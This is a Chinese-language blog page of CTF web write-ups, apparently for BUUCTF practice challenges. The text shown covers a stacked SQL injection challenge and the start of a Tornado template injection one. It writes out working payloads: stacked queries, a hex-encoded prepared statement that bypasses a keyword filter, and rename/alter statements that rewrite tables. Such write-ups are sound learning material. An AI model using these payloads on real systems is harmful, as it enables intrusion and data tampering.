@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>BUU-WEB（一） | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="[ACTF2020 新生赛]BackupFile[极客大挑战 2019]Upload 本来一题一篇文章，结果发现太浪费了，所以整合起来了， 随便注随便输入一个单引号，报错                                                                                                             order">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU-WEB（一）">
+<meta property="og:url" content="https://yichen115.github.io/2020/02/20/adhlix/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="[ACTF2020 新生赛]BackupFile[极客大挑战 2019]Upload 本来一题一篇文章，结果发现太浪费了，所以整合起来了， 随便注随便输入一个单引号，报错                                                                                                             order">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=206&originWidth=1759&size=0&status=done&style=none&width=1042">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298100-06781bef-d530-4026-bac8-bcd656294898.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=210&originWidth=555&size=0&status=done&style=none&width=499">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=175&originWidth=811&size=0&status=done&style=none&width=811">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&originHeight=903&originWidth=1118&size=0&status=done&style=none&width=559">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58.png#align=left&display=inline&height=567&margin=%5Bobject%20Object%5D&originHeight=567&originWidth=493&size=0&status=done&style=none&width=493">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&originHeight=607&originWidth=368&size=0&status=done&style=none&width=368">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead.png#align=left&display=inline&height=309&margin=%5Bobject%20Object%5D&originHeight=606&originWidth=1246&size=0&status=done&style=none&width=635">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=253&originWidth=639&size=0&status=done&style=none&width=639">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be.png#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=283&originWidth=663&size=0&status=done&style=none&width=534">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&originHeight=130&originWidth=218&size=0&status=done&style=none&width=210">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&originHeight=103&originWidth=170&size=0&status=done&style=none&width=170">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298110-183b7d1b-bf44-45fb-8342-24311468d632.png#align=left&display=inline&height=98&margin=%5Bobject%20Object%5D&originHeight=127&originWidth=395&size=0&status=done&style=none&width=305">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=1243&size=0&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&originHeight=240&originWidth=1076&size=0&status=done&style=none&width=687">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298103-d507818f-47f7-40db-9971-d155a481cfa3.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=795&size=0&status=done&style=none&width=660">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=217&originWidth=806&size=0&status=done&style=none&width=806">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=305&originWidth=1740&size=0&status=done&style=none&width=1164">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298337-2b7fe544-a6db-47a8-b6a4-4426c056d5ad.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=265&originWidth=1238&size=0&status=done&style=none&width=1037">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298329-2978242a-bbc1-4494-8946-b60ae1860d2f.png#align=left&display=inline&height=176&margin=%5Bobject%20Object%5D&originHeight=327&originWidth=1146&size=0&status=done&style=none&width=617">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298347-12a9e4e8-7d99-45ff-819b-8b75436caab9.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=620&originWidth=1250&size=0&status=done&style=none&width=891">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298345-bd055ae4-c1c2-4087-8a48-c35f0f1c635f.png#align=left&display=inline&height=149&margin=%5Bobject%20Object%5D&originHeight=149&originWidth=783&size=0&status=done&style=none&width=783">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298399-386dba62-536d-4f74-8fe0-c2b29446b7ec.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&originHeight=405&originWidth=1911&size=0&status=done&style=none&width=1102">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298336-26c74407-7e56-4b09-9097-c0db8d9121f4.png#align=left&display=inline&height=222&margin=%5Bobject%20Object%5D&originHeight=222&originWidth=395&size=0&status=done&style=none&width=395">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298417-f4a90eb9-b665-4af4-ada8-22738f451b93.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=196&originWidth=722&size=0&status=done&style=none&width=722">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298466-d2bb36a7-07f4-41ab-97f9-9cfadcdea7d4.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&originHeight=257&originWidth=1116&size=0&status=done&style=none&width=751">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298491-3df9bf54-a677-4591-aefa-0a442b890b40.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&originHeight=181&originWidth=1059&size=0&status=done&style=none&width=1059">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298436-3ea6e979-6a2e-4737-b083-78320f548bae.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&originHeight=152&originWidth=424&size=0&status=done&style=shadow&width=424">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298655-c0aaeb77-f67c-48c6-a2b5-23213c49c7c1.png#align=left&display=inline&height=156&margin=%5Bobject%20Object%5D&originHeight=156&originWidth=473&size=0&status=done&style=shadow&width=473">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298685-a18c89f4-bf7f-46b2-b446-77fd58b5b465.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&originHeight=408&originWidth=1105&size=0&status=done&style=none&width=720">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599439530112-38110668-82aa-44e5-a7ad-fcf4173058d1.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1048&size=112267&status=done&style=stroke&width=524">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599441456096-099530c3-e706-4d9d-9d47-9f5d0069078d.png#align=left&display=inline&height=555&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1262&size=122033&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599457047473-389a1d6d-9a43-4242-9532-a5b78c34d7a2.png#align=left&display=inline&height=373&margin=%5Bobject%20Object%5D&name=image.png&originHeight=745&originWidth=1153&size=89853&status=done&style=stroke&width=576.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599459160439-55f026c7-c2b2-42c2-a289-f73a56a6c555.png#align=left&display=inline&height=348&margin=%5Bobject%20Object%5D&name=image.png&originHeight=695&originWidth=1305&size=105937&status=done&style=stroke&width=652.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1599460088458-01e567c9-3e95-4a28-8161-93c05a2f6bfa.png#align=left&display=inline&height=260&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=375&size=26979&status=done&style=stroke&width=291">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600066589109-78520007-e35a-44ce-9f7e-16cd2028e7e8.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=612&originWidth=1214&size=106377&status=done&style=stroke&width=677">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600066859906-6432a015-8c1d-438f-9f3d-8a98fceb8901.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=1445&size=51221&status=done&style=stroke&width=722.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600067327093-48e5311e-0218-4078-9a16-bd150d040658.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1079&originWidth=1920&size=195495&status=done&style=stroke&width=960">
+<meta property="article:published_time" content="2020-02-20T09:18:10.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.697Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=206&originWidth=1759&size=0&status=done&style=none&width=1042">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">BUU-WEB（一）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">BUU-WEB（一）</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-20T09:18:10.000Z" itemprop="datePublished" class="page-time">
+  2020-02-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#随便注"><span class="post-toc-number">1.</span> <span class="post-toc-text">随便注</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#easy-tornado"><span class="post-toc-number">2.</span> <span class="post-toc-text">easy_tornado</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#EasySQL"><span class="post-toc-number">3.</span> <span class="post-toc-text">EasySQL</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#高明的黑客"><span class="post-toc-number">4.</span> <span class="post-toc-text">高明的黑客</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#admin"><span class="post-toc-number">5.</span> <span class="post-toc-text">admin</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#checkin"><span class="post-toc-number">6.</span> <span class="post-toc-text">checkin</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hack-World"><span class="post-toc-number">7.</span> <span class="post-toc-text">Hack World</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Easy-Cacl"><span class="post-toc-number">8.</span> <span class="post-toc-text">Easy Cacl</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#极客大挑战-2019-LoveSQL"><span class="post-toc-number">9.</span> <span class="post-toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ACTF2020-新生赛-Include"><span class="post-toc-number">10.</span> <span class="post-toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="post-toc-number">11.</span> <span class="post-toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ACTF2020-新生赛-Exec"><span class="post-toc-number">12.</span> <span class="post-toc-text">[ACTF2020 新生赛]Exec</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#极客大挑战-2019-Http"><span class="post-toc-number">13.</span> <span class="post-toc-text">[极客大挑战 2019]Http</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#极客大挑战-2019-BabySQL"><span class="post-toc-number">14.</span> <span class="post-toc-text">[极客大挑战 2019]BabySQL</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#极客大挑战-2019-Upload"><span class="post-toc-number">15.</span> <span class="post-toc-text">[极客大挑战 2019]Upload</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ACTF2020-新生赛-BackupFile"><span class="post-toc-number">16.</span> <span class="post-toc-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ACTF2020-新生赛-Upload"><span class="post-toc-number">17.</span> <span class="post-toc-text">[ACTF2020 新生赛]Upload</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#极客大挑战-2019-BuyFlag"><span class="post-toc-number">18.</span> <span class="post-toc-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ZJCTF-2019-NiZhuanSiWei"><span class="post-toc-number">19.</span> <span class="post-toc-text">[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BJDCTF2020-Easy-MD5"><span class="post-toc-number">20.</span> <span class="post-toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#网鼎杯-2018-Fakebook"><span class="post-toc-number">21.</span> <span class="post-toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#极客大挑战-2019-HardSQL"><span class="post-toc-number">22.</span> <span class="post-toc-text">[极客大挑战 2019]HardSQL</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#GXYCTF2019-BabySQli"><span class="post-toc-number">23.</span> <span class="post-toc-text">[GXYCTF2019]BabySQli</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-adhlix"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">BUU-WEB（一）</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-20 17:18:10" datetime="2020-02-20T09:18:10.000Z"  itemprop="datePublished">2020-02-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>[ACTF2020 新生赛]BackupFile[极客大挑战 2019]Upload 本来一题一篇文章，结果发现太浪费了，所以整合起来了，</p>
+<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>随便输入一个单引号，报错</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298120-0677bea3-3280-4bca-a777-7a2a4c4956b4.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&originHeight=206&originWidth=1759&size=0&status=done&style=none&width=1042" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>order by 3 就不行了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298100-06781bef-d530-4026-bac8-bcd656294898.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=210&originWidth=555&size=0&status=done&style=none&width=499" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>尝试联合查询的时候出现提示：<br>“/select|update|delete|drop|insert|where|./i”</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298088-df3aa016-4844-4f97-8a1c-8c5c21b9110f.png#align=left&display=inline&height=175&margin=%5Bobject%20Object%5D&originHeight=175&originWidth=811&size=0&status=done&style=none&width=811" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>一个正则可视化网站：<a href="https://regexper.com" target="_blank" rel="noopener">https://regexper.com</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298053-73ea4a24-252e-4c4f-8f8e-cb1796babd8b.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&originHeight=903&originWidth=1118&size=0&status=done&style=none&width=559" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>使用堆叠注入：1’;show tables;#</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298128-71010914-7be7-4909-8cfb-188bc5f87b58.png#align=left&display=inline&height=567&margin=%5Bobject%20Object%5D&originHeight=567&originWidth=493&size=0&status=done&style=none&width=493" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>看一下表里有什么列名：1’;show columns from <code>1919810931114514</code>;#<br>（注意，字符串为表名的表操作时要加反引号）</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298122-319cf83c-e4ed-4844-825d-639e4cfac894.png#align=left&display=inline&height=607&margin=%5Bobject%20Object%5D&originHeight=607&originWidth=368&size=0&status=done&style=none&width=368" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>但是没办法使用 select * from <code>1919810931114514</code><br>看网上师傅们有两种方法，第一种：<strong>mysql 预定义语句</strong><br><strong>1</strong>‘;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;Prepare execsql from @a;execute execsql;#</p>
+<p>hex decode 以后是：?inject=1’;SeT@a=select * from <code>**1919810931114514**</code>;Prepare execsql from @a;execute execsql;#</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298106-9393a75f-e1f4-49c4-a82c-17b8a2f17ead.png#align=left&display=inline&height=309&margin=%5Bobject%20Object%5D&originHeight=606&originWidth=1246&size=0&status=done&style=none&width=635" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>还有一种方法时是：<strong>改表名  **这样查询的时候就可以查询到 flag<br>?inject=</strong>1**’;<br>rename tables <code>words</code> to <code>test</code>;rename tables <code>1919810931114514</code> to <code>words</code>;<br>alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#</p>
+<p>意思分别是：把  words  表改名为 test，把 1919810931114541  改名为  words<br>把列名 flag  改为 id</p>
+<p>这样在 1’; or 1=1# 查询的时候就会把所有的都列出来，这样就可以看到 flag  了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298281-e70d996d-bdc2-46a1-847f-e7fb9dbb00f6.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=253&originWidth=639&size=0&status=done&style=none&width=639" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>打开看到有三个文件：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298252-e06ca652-0d67-4a6b-a567-4c2f203196be.png#align=left&display=inline&height=228&margin=%5Bobject%20Object%5D&originHeight=283&originWidth=663&size=0&status=done&style=none&width=534" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>三个文件内容如下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298186-1dd07d54-87e3-4052-9111-369d5a99e530.png#align=left&display=inline&height=125&margin=%5Bobject%20Object%5D&originHeight=130&originWidth=218&size=0&status=done&style=none&width=210" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298074-6cad8b42-317a-4e42-ae6b-bc36c2e1e14a.png#align=left&display=inline&height=103&margin=%5Bobject%20Object%5D&originHeight=103&originWidth=170&size=0&status=done&style=none&width=170" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298110-183b7d1b-bf44-45fb-8342-24311468d632.png#align=left&display=inline&height=98&margin=%5Bobject%20Object%5D&originHeight=127&originWidth=395&size=0&status=done&style=none&width=305" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>通过 url 知道，访问一个文件需要知道：filename  跟  filehash</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298160-6b4634f5-99aa-4f78-a94f-facc6ea2218d.png#align=left&display=inline&height=186&margin=%5Bobject%20Object%5D&originHeight=310&originWidth=1243&size=0&status=done&style=none&width=746" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>企图直接访问是不行的，想到了 burp  抓包，但是抓了半天没抓到，看了网上的 wp  是 <strong>模版注入</strong><br>**</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298259-b3411ff4-7dbe-4601-a2f1-2f484ca529e9.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&originHeight=240&originWidth=1076&size=0&status=done&style=none&width=687" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>tornado 是一个 python 的模板，welcome.txt  中的  render  是 python  中的一个渲染函数，<br>报错时候的 url  是这样的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298103-d507818f-47f7-40db-9971-d155a481cfa3.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=248&originWidth=795&size=0&status=done&style=none&width=660" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>尝试把后面换成：<code>111</code>，输出了！</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298371-a461eea1-6a9b-45a7-96e8-9cbc5321dd87.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=217&originWidth=806&size=0&status=done&style=none&width=806" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 tornado 模板中，存在一些可以访问的快速对象，例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123; escape(handler.settings["cookie"]) &#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么输入：<code>****</code><br>**</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1582190298335-26629580-adc0-407f-9b0f-cdaf0eeec081.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=305&originWidth=1740&size=0&status=done&style=none&width=1164" alt="" title="">
+                </div>
